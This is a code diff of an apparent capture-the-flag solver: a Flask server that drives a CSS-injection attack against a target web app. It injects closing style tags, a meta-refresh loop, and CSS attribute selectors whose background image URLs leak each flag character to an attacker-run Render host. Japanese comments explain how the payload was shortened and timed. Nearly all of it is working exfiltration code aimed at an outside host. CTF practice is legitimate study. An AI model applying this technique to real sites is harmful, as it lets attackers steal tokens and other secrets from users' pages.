@@ -6,17 +6,15 @@ import os
 app = Flask(__name__)
 
 # ==========================================
-# 設定
-MY_URL = "https://capture-the-f-l-a-g.onrender.com" # あなたのRender URL
+MY_URL = "https://capture-the-f-l-a-g.onrender.com"
 TARGET_URL = "http://web:3000"
-# アルファベット小文字、数字、記号（必要に応じて大文字も追加してください）
-CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
+# 必要最小限の文字セット（大文字が必要な場合は追加してください）
+CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
 KNOWN_FLAG = "tkbctf{"
 # ==========================================
 
 @app.route('/start')
 def start():
-    """Botに最初に踏ませるエンドポイント"""
     global KNOWN_FLAG
     KNOWN_FLAG = "tkbctf{"
     print("[*] Attack Started! Resetting flag...", file=sys.stderr)
@@ -36,39 +34,38 @@ def start():
 
 @app.route('/next')
 def next_char():
-    """次の1文字を特定するための軽量化CSSとURLを動的に生成する"""
     global KNOWN_FLAG
-    
     if KNOWN_FLAG.endswith("}"):
         return f"<h1>Attack Finished!</h1><p>Flag: {KNOWN_FLAG}</p>"
 
     current_pos = len(KNOWN_FLAG)
     print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {current_pos})", file=sys.stderr)
 
+    # URLサイズの極小化（https: を削る）
+    base_url = MY_URL.replace("https:", "").replace("http:", "") 
     css_rules = []
-    # tはテキストとして吸収されるため、1つ目の<a>タグは'k'になる。
-    # つまり current_pos の数値がそのまま <a> タグの順番（nth-of-type）と一致する！
-    target_nth = current_pos
 
     for char in CHARSET:
-        # URLを極限まで短くするため、エンドポイントを /l に変更
-        rule = f"a:nth-of-type({target_nth})[id^='{char}']{{display:block;padding:1px;background:url({MY_URL}/l?c={char}&p={current_pos})}}"
+        safe_char = urllib.parse.quote(char)
+        # 極限までダイエットしたCSS（1ルール約80バイト）
+        rule = f"a:nth-of-type({current_pos})[id='{char}']{{display:block;background:url({base_url}/l?c={safe_char}&p={current_pos})}}"
         css_rules.append(rule)
 
     css_payload = "".join(css_rules)
 
-    # ping-pongの間隔を0.5秒に短縮（10秒間で20文字抜くため）
-    sep0 = f'"></style><meta http-equiv="refresh" content="0.5; url={MY_URL}/next"><style>{css_payload}</style>'
+    # 間隔を1.0秒に設定（通信の安定性確保）
+    sep0 = f'"></style><meta http-equiv="refresh" content="1.0;url={MY_URL}/next"><style>{css_payload}</style>'
     sep1 = '<a id="'
 
     params = urllib.parse.urlencode({'sep[]': [sep0, sep1]}, doseq=True)
     exploit_url = f"{TARGET_URL}/?{params}"
     
+    # URLサイズを確認用に出力
+    print(f"[*] Payload URL Length: {len(exploit_url)} bytes", file=sys.stderr)
     return redirect(exploit_url)
 
 @app.route('/l')
 def leak():
-    """CSSからの画像リクエスト（1文字特定）を受け取るエンドポイント"""
     global KNOWN_FLAG
     char = request.args.get('c')
     pos = request.args.get('p', type=int)
